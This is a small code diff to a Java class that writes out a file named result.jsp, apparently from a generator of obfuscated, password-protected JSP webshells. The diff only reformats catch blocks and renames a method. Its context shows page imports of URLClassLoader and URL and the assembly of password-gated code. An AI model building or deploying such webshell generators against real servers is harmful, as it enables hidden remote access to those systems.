@@ -13,13 +13,13 @@ public class WriteUtil {
                     .append("<%!").append(decCode).append("%>")
                     .append("<%").append(antCode).append("%>");
             FileUtil.writeFile("result.jsp", compactCode(sb.toString()));
-        }catch (Exception e){
+        } catch (Exception e) {
             e.printStackTrace();
         }
     }
 
-    public static void writeSuper(MethodDeclaration method,MethodDeclaration decMethod,
-                                  String password,boolean useUnicode){
+    public static void writeJavac(MethodDeclaration method, MethodDeclaration decMethod,
+                                  String password, boolean useUnicode) {
         String prefix = "<%@ page import=\"java.net.URL\" %>\n" +
                 "<%@ page import=\"java.net.URLClassLoader\" %>\n" +
                 "<%@ page import=\"java.nio.charset.Charset\" %>\n" +
@@ -51,7 +51,7 @@ public class WriteUtil {
                     FileUtil.writeFile("result.jsp", output);
                 }
             }
-        }catch (Exception e){
+        } catch (Exception e) {
             e.printStackTrace();
         }
     }
